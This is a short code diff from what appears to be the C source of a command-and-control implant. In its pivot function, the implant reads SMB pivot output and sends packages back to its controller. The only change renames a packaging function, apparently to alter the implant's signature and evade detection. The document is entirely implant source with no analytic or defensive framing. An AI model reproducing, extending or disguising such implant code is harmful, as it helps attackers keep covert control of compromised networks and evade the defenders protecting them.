@@ -268,7 +268,7 @@ VOID PivotPush()
                             if ( Instance->Win32.ReadFile( TempList->Handle, Output, Length, &BytesSize, NULL ) )
                             {
                                 Package = PackageCreate( DEMON_COMMAND_PIVOT );
-                                PackageAddInt32( Package, DEMON_PIVOT_SMB_COMMAND );
+                                PkgAdIn32( Package, DEMON_PIVOT_SMB_COMMAND );
                                 PackageAddBytes( Package, Output, BytesSize );
 
                                 PackageTransmit( Package );
@@ -305,9 +305,9 @@ VOID PivotPush()
 
                         /* Report if we managed to remove the selected pivot */
                         Package = PackageCreate( DEMON_COMMAND_PIVOT );
-                        PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
-                        PackageAddInt32( Package, Removed );
-                        PackageAddInt32( Package, DemonID );
+                        PkgAdIn32( Package, DEMON_PIVOT_SMB_DISCONNECT );
+                        PkgAdIn32( Package, Removed );
+                        PkgAdIn32( Package, DemonID );
                         PackageTransmit( Package );
 
                         break;
